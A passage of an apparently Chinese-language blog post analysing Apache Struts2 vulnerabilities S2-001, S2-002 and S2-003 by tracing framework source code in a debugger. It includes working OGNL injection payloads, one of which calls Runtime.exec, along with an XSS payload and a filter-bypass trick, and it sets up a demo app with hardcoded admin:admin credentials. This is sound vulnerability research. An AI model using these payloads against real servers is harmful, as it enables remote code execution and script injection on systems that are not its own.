class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginAction</span>  &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.isEmpty()) || (<span class="hljs-built_in">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.username.equals(<span class="hljs-string">&quot;admin&quot;</span>)) &amp;&amp; (<span class="hljs-built_in">this</span>.password.equals(<span class="hljs-string">&quot;admin&quot;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有处理请求的 action 和 发送请求的页面 index.jsp 了，怎么把他俩给映射起来呢？</p>
<p>创建 <code>src/main/resources/struts.xml</code> 配置文件，用来把 action 和 jsp 做映射</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;default&quot;</span>  <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--        action的name属性是访问路径， method指拦截请求后要执行的方法--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lingx5.action.LoginAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--            result是 根据action类的返回值 跳转不同的 jsp页面--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/hello.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>整体的项目结构</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407143216436.png" srcset="/img/loading.gif" lazyload alt="image-20250407143216436" style="zoom:67%;" />

<p>我们启动项目</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407133753074.png" srcset="/img/loading.gif" lazyload alt="image-20250407133753074" style="zoom:67%;" />

<p>可以登录一下 输入 <code>admin:admin</code> </p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407144320996.png" srcset="/img/loading.gif" lazyload alt="image-20250407144320996"></p>
<p>登录成功，现在这个漏洞项目就搭建好了</p>
<p>说一下具体的执行流程</p>
<p>用户访问 index.jsp 首页，输入 username 和 password 点击 submit 提交，表单设置的 <code>action=&quot;login&quot;</code> , struts2 会去从 struts.xml 文件需找 login 的 action ，执行 LoginAction 对应的方法 根据返回结果 返回 struts.xml 中 对应的 jsp 页面</p>
<p>这就是最基本的访问流程</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在 password 输入 <code>%&#123;2+2&#125;</code> </p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407145041981.png" srcset="/img/loading.gif" lazyload alt="image-20250407145041981" style="zoom:50%;" />

<p>点击 submit 后</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407145131640.png" srcset="/img/loading.gif" lazyload alt="image-20250407145131640" style="zoom:50%;" />

<p>执行了</p>
<p>我们看看他是如何解析执行的</p>
<p>我们收来来到 struts2 的标签解析的方法，在定义的标签上，ctrl 左键</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161432059.png" srcset="/img/loading.gif" lazyload alt="image-20250407161432059"></p>
<p>看到是由 org.apache.struts2.views.jsp.ui.TextFieldTag 做的解析</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161542410.png" srcset="/img/loading.gif" lazyload alt="image-20250407161542410"></p>
<p>我们来看一下这个类，勾上继承，可以查看继承的父类方法</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161725115.png" srcset="/img/loading.gif" lazyload alt="image-20250407161725115" style="zoom:67%;" />

<p>发现他继承了 ComponentTagSupport#doStartTag 和 ComponentTagSupport#doEndTag 方法，顾名思义这两个方法肯定就是标签开始解析，和标签结束解析的方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407161929328.png" srcset="/img/loading.gif" lazyload alt="image-20250407161929328"></p>
<p>我们在 doEndTag 下断点</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162137437.png" srcset="/img/loading.gif" lazyload alt="image-20250407162137437"></p>
<p>同样在 password 的标签发送 %{2+2} 这个 ognl 表达式</p>
<p>我们拦截道 password 的标签</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162612306.png" srcset="/img/loading.gif" lazyload alt="image-20250407162612306"></p>
<p>步入这个 end 方法，来到 UIBean#end 方法，调用了 evaluateParams() 方法，名字也可以看出来 <code>评估参数</code></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407162716484.png" srcset="/img/loading.gif" lazyload alt="image-20250407162716484"></p>
<p>步入，一直往下走，我们会来到 findValue() 方法，解析 ognl 表达式</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407163911653.png" srcset="/img/loading.gif" lazyload alt="image-20250407163911653"></p>
<p>我们进入看看这个方法是如何解析 ognl 表达式的</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407164215119.png" srcset="/img/loading.gif" lazyload alt="image-20250407164215119"></p>
<p>我们步入 TextParseUtil.translateVariables() 方法，可以看到这个方法写了一个死循环，也就是说只要是 ognl 表达式，他就会循环解析，<strong>他还没有做过滤，这就给我们 ognl 注入提供了条件</strong></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407164331838.png" srcset="/img/loading.gif" lazyload alt="image-20250407164331838"></p>
<p>我们现在还是 <code>%&#123;password&#125;</code> ，肯定是要先去获取我们在输入框里 传的值：<code>%&#123;2+2&#125;</code> 继续往下走</p>
<p>看到经过处理后 从 stack 中 找 password 对应的值了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407171033540.png" srcset="/img/loading.gif" lazyload alt="image-20250407171033540"></p>
<p>一步步跟，看到他 在 ognl.ASTProperty#getValueBody 方法中 拿到了 password 对应的字段值</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407170252577.png" srcset="/img/loading.gif" lazyload alt="image-20250407170252577"></p>
<p>调用栈</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">93</span>, ASTProperty (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">333</span>, Ognl (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">194</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">238</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">122</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">71</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">313</span>, Component (org.apache.struts2.components)<br><span class="hljs-symbol">evaluateParams:</span><span class="hljs-number">723</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">end:</span><span class="hljs-number">481</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">doEndTag:</span><span class="hljs-number">43</span>, ComponentTagSupport (org.apache.struts2.views.jsp)<br></code></pre></td></tr></table></figure>

<p>我们拿到 <code>%&#123;2+2&#125;</code> 了</p>
<p>一路弹栈，来到最初的 <code>TextParseUtil#translateVariables</code> 的死循环解析中，下次循环就开始解析  <code>%&#123;2+2&#125;</code>  这个 ognl 表达式了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407171313020.png" srcset="/img/loading.gif" lazyload alt="image-20250407171313020"></p>
<p>看到在 ognl.Ognl#getValue() 方法中 <code>“2+2”</code> 这个表达式已经被抽象成 ASTAdd 这个语法树了, 此时执行 getValue() 方法，就是执行加法了</p>
<blockquote>
<p>这里抽象语法树的类型有很多，每种都有自己的实现，以完成 ognl 不同的功能</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407183948085.png" srcset="/img/loading.gif" lazyload alt="image-20250407183948085" style="zoom:50%;" /></blockquote>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407181821213.png" srcset="/img/loading.gif" lazyload alt="image-20250407181821213"></p>
<p>跟如</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407183201335.png" srcset="/img/loading.gif" lazyload alt="image-20250407183201335"></p>
<blockquote>
<p>注意 ognl 对执行过得表达式，会进行缓存，尝试重启服务清理缓存就会跟到这里了</p>
</blockquote>
<p>然后就是回显，利用 UIBean 这个类，添加 name value 进行回显</p>
<p> 一路弹栈，回到 UIBean 执行 addParameter()</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407184330379.png" srcset="/img/loading.gif" lazyload alt="image-20250407184330379"></p>
<p>然后调用 mergeTemplate 完成回显</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407184522019.png" srcset="/img/loading.gif" lazyload alt="image-20250407184522019"></p>
<p>当然，我们也可以利用 ognl 表达式，主动解析回显，利用 HttpServletResponse 写回页面即可</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">%&#123;<br>#writer=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),<br>#writer.println(<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty(&quot;user.dir&quot;)</span>),<br>#writer.flush(),<br>#writer.close()<br>&#125;<br></code></pre></td></tr></table></figure>

<p>成功回显</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407185415274.png" srcset="/img/loading.gif" lazyload alt="image-20250407185415274" style="zoom: 67%;" />

<h2 id="s2-002"><a href="#s2-002" class="headerlink" title="s2-002"></a>s2-002</h2><p><code>Struts2-002</code> 是一个 <code>XSS</code> 漏洞，该漏洞发生在 <code>s:url</code> 和 <code>s:a</code> 标签中，当标签的属性 <code>includeParams=all</code> 时，即可触发该漏洞。</p>
<p>漏洞影响版本： <code>Struts 2.0.0 - Struts 2.1.8.1</code> 。更多详情可参考官方通告：<br><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-002">https://cwiki.apache.org/confluence/display/WW/S2-002</a></p>
<p>启动项目</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407201025542.png" srcset="/img/loading.gif" lazyload alt="image-20250407201025542" style="zoom:50%;" />

<p>访问</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://localhost:8080/S002/login.action?<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>触发 xss</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250407201157202.png" srcset="/img/loading.gif" lazyload alt="image-20250407201157202" style="zoom:33%;" />

<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>依然会在 ComponentTagSupport#doStartTag 和 doEndTag 解析标签，我们在 doStartTag 打断点，看他是如何造成 xss 的</p>
<p>我们是从 urlTag 类，执行的父类方法的 doStartTag </p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407210625744.png" srcset="/img/loading.gif" lazyload alt="image-20250407210625744"></p>
<p>会调用 start 我们步入，会看到为什么漏洞要求 includeParams 为 all</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407210842109.png" srcset="/img/loading.gif" lazyload alt="image-20250407210842109"></p>
<p>我们步入 mergeRequestParameters，看到它获取到了我们传入的 payload，并存放在了 parameters 表中</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211040359.png" srcset="/img/loading.gif" lazyload alt="image-20250407211040359"></p>
<p>下面会执行 includeGetParameters，我们同样会调用到 mergeRequestParameters</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211352524.png" srcset="/img/loading.gif" lazyload alt="image-20250407211352524"></p>
<p>存放了一个进行 url 编码的 payload</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407211431190.png" srcset="/img/loading.gif" lazyload alt="image-20250407211431190"></p>
<p>最后的 includeExtraParameters 为 null</p>
<p>之后就来到了 doStartTag 的 return</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407212043371.png" srcset="/img/loading.gif" lazyload alt="image-20250407212043371"></p>
<blockquote>
<ul>
<li><strong>0</strong>：对应 Tag.SKIP_BODY，表示跳过标签主体，不对其进行处理。</li>
<li><strong>1</strong>：对应 Tag.EVAL_BODY_INCLUDE，表示评估标签主体并将其直接包含到输出中。</li>
<li><strong>2</strong>：对应 BodyTag.EVAL_BODY_BUFFERED，表示评估标签主体并将其缓冲起来，以便后续处理（仅适用于实现了 BodyTag 接口的标签）。</li>
</ul>
</blockquote>
<p>我们接着看 doEndTag 是如何进行处理的</p>
<p>我们回跳转到 org.apache.struts2.components.URL#end 方法 会调用 determineActionURL 来获取 url</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407212804951.png" srcset="/img/loading.gif" lazyload alt="image-20250407212804951"></p>
<p>result 会包含 payload，然后 调用 writer.write 写回页面，</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407213347328.png" srcset="/img/loading.gif" lazyload alt="image-20250407213347328"></p>
<p>浏览器页面解析 触发 xss</p>
<p>执行完成之后</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250407213854573.png" srcset="/img/loading.gif" lazyload alt="image-20250407213854573"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>后续的修复也挺水的</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">result = link.toString(); result.indexOf(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>) &gt; <span class="hljs-number">0</span>; result = result.replaceAll(<span class="hljs-string">&quot;&lt;script&gt;&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>)) <br></code></pre></td></tr></table></figure>

<p>这个可以轻松 双写绕过 <code>&lt;&lt;script&gt;&gt;</code> </p>
<h2 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h2><p>这是又爆出来的 RCE 漏洞，这个漏洞主要是参数名使用了 ognl 解析</p>
<p>影响版本：Struts 2.0.0 - Struts 2.1.8.1<br>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-003">S2-003 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
<p>这个要在 tomcat6 下，而且不需要 struts 标签，只需要一个 action 类即可</p>
<p>主要是 struts2 在 调用 com.opensymphony.xwork2.interceptor.ParametersInterceptor 拦截器时，解析参数名的 ognl 导致的</p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看看 ParametersInterceptor 这个类，做了那些事情</p>
<p>首先关注的肯定就是 setParameters 这个主要来解析我们参数的方法</p>
<h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><blockquote>
<p>但这并不是我们的入口函数，入口是拦截器的 ParametersInterceptor#intercept 这个方法，他经过判断调用了 setParameters 后边在讲</p>
</blockquote>
<p>首先给个正常的参数值 lingx5 &#x3D; 1</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250408101743208.png" srcset="/img/loading.gif" lazyload alt="image-20250408101743208" style="zoom:50%;" />

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameters</span><span class="hljs-params">(Object action, ValueStack stack, Map parameters)</span> &#123;<br>    <span class="hljs-type">ParameterNameAware</span> <span class="hljs-variable">parameterNameAware</span> <span class="hljs-operator">=</span> action <span class="hljs-keyword">instanceof</span> ParameterNameAware ? (ParameterNameAware)action : <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.ordered) &#123;<br>        params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(<span class="hljs-built_in">this</span>.getOrderedComparator());<br>        params.putAll(parameters);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(parameters);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(Map.Entry entry : params.entrySet()) &#123;<br>        <span class="hljs-comment">// 把参数名 转为字符串，赋给name变量</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey().toString();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">acceptableName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.acceptableName(name) &amp;&amp; (parameterNameAware == <span class="hljs-literal">null</span> || parameterNameAware.acceptableParameterName(name));<br>        <span class="hljs-keyword">if</span> (acceptableName) &#123;<br>            <span class="hljs-comment">// 获得传递参数的值，也就是name的值</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> entry.getValue();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 把名字和值，存放到 stack中，我们要去看，这个方法是如何执行的</span><br>                stack.setValue(name, value);<br>            &#125; <span class="hljs-keyword">catch</span> (RuntimeException e) &#123;<br>                <span class="hljs-keyword">if</span> (devMode) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">developerNotification</span> <span class="hljs-operator">=</span> LocalizedTextUtil.findText(ParametersInterceptor.class, <span class="hljs-string">&quot;devmode.notification&quot;</span>, ActionContext.getContext().getLocale(), <span class="hljs-string">&quot;Developer Notification:\n&#123;0&#125;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;e.getMessage()&#125;);<br>                    LOG.error(developerNotification);<br>                    <span class="hljs-keyword">if</span> (action <span class="hljs-keyword">instanceof</span> ValidationAware) &#123;<br>                        ((ValidationAware)action).addActionMessage(developerNotification);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    LOG.error(<span class="hljs-string">&quot;ParametersInterceptor - [setParameters]: Unexpected Exception catched: &quot;</span> + e.getMessage());<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102032765.png" srcset="/img/loading.gif" lazyload alt="image-20250408102032765"></p>
<p>来到 stack.setValue(name, value) 我们步入，发现他会调用 OgnlUtil#setValue 方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102135883.png" srcset="/img/loading.gif" lazyload alt="image-20250408102135883"></p>
<p>继续跟入，发现他会去封装一个 Node 节点，这就有意思了</p>
<blockquote>
<p>我们之前也讲到过，ognl 有很多的 node 节点，也就是 AST 的一些实现</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102747975.png" srcset="/img/loading.gif" lazyload alt="image-20250408102747975" style="zoom: 50%;" />

<p>每种都有不同的功能</p>
</blockquote>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102610006.png" srcset="/img/loading.gif" lazyload alt="image-20250408102610006"></p>
<p>正常情况下，会封装一个 ASTProperty 的节点</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408102858631.png" srcset="/img/loading.gif" lazyload alt="image-20250408102858631"></p>
<p>执行他的 setValueBody 方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408103021214.png" srcset="/img/loading.gif" lazyload alt="image-20250408103021214"></p>
<p>我们知道了这些，就可以看看 有没有一个 抽象语法书的 setValueBody 方法 是可以直接解析 ognl 表达式的</p>
<h3 id="ASTEval-分析"><a href="#ASTEval-分析" class="headerlink" title="ASTEval 分析"></a>ASTEval 分析</h3><p><strong>最终找到了 ASTEval 这个节点的 setValueBody 方法</strong></p>
<p>我们来看一下他是如何解析的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValueBody</span><span class="hljs-params">(OgnlContext context, Object target, Object value)</span> <span class="hljs-keyword">throws</span> OgnlException &#123;<br>    <span class="hljs-comment">// 取第一个 children 的值并计算，给到 expr</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>. children[<span class="hljs-number">0</span>].getValue(context, target);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">previousRoot</span> <span class="hljs-operator">=</span> context.getRoot();<br>    <span class="hljs-comment">// 取第二个 children 的值并计算，给到 target</span><br>    target = <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>].getValue(context, target);<br>    <span class="hljs-comment">// 判断 expr 是否为 node 类型，如果不是，则调用 Ognl.parseExpression() 尝试进行解析，解析的结果强转为 node 类型；</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> expr <span class="hljs-keyword">instanceof</span> Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        context.setRoot(target);<br>        <span class="hljs-comment">// 最后调用 setValue </span><br>        node.setValue(context, target, value);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        context.setRoot(previousRoot);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过上述代码逻辑，我们不难发现我们的参数形式应该是 <code>(one)(two)</code> 这种，且 children [0] 也就是 <code>(one)</code> 如果是 ognl 表达式的话，就会被 Ognl.parseExpression 解析</p>
<p>我们尝试传入 payload 参数 <code>(one)(two)</code> , 看到抽象成了，ASTEval 这种节点</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408130408561.png" srcset="/img/loading.gif" lazyload alt="image-20250408130408561"></p>
<p>看到进入了 ASTEval 的 setValueBody 方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408130520271.png" srcset="/img/loading.gif" lazyload alt="image-20250408130520271"></p>
<p>那我们尝试传入 ognl 表达式，看看能不能正常解析呢?</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-symbol">&#x27;@java.lang.Runtime@getRuntime</span>().exec(\<span class="hljs-symbol">&#x27;calc</span>\&#x27;)&#x27;)(<span class="hljs-symbol">&#x27;aaa</span>&#x27;)<br></code></pre></td></tr></table></figure>

<p>并没有执行，我们调试一下看看</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408164738608.png" srcset="/img/loading.gif" lazyload alt="image-20250408164738608"></p>
<p>调用栈</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">98</span>, XWorkMethodAccessor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">847</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">65</span>, ASTStaticMethod (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span 